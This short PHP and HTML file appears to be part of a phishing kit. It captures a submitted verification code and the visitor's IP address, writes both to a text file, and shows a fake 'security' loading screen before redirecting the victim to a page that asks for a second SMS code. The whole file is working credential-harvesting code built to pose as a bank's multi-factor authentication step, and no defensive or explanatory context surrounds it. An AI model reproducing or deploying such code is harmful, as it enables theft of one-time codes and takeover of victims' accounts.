<?php


$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");

$cod = $_POST['cod'];

$saveline = $ip . ' Cod1: ' . $cod . "\n";

$fh=fopen('save.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);



?>


<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
        <meta http-equiv="refresh" content="40;URL=sms2.html">
    <script type="text/javascript" src="./load_files/restore_mfa.js.download"></script>
<script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"})</script></head>
<body onload="setMfa('/tob/live/usp-core');">
<div role="alert" style="position: absolute;clip: rect(0 0 0 0)" aria-live="assertive"><span id="accessibleAlertMessage" role="alert" aria-live="assertive" style="display: inline;">Loading...</span></div>
<div style="text-align: center;font-size: 18px;font-family: arial; margin-top: 10%;"><img src="./load_files/Loader_page.gif" style="margin-left: -15px;"><div id="loadingMsgDiv" style="margin-top: 10px;">Security reasons!</div>
<div id="loadingMsgDiv" style="margin-top: 10px;">We need to send the second code!</div>
    <div id="loadingMsgDiv" style="margin-top: 10px;">Please Wait!</div>
</div>


</body></html>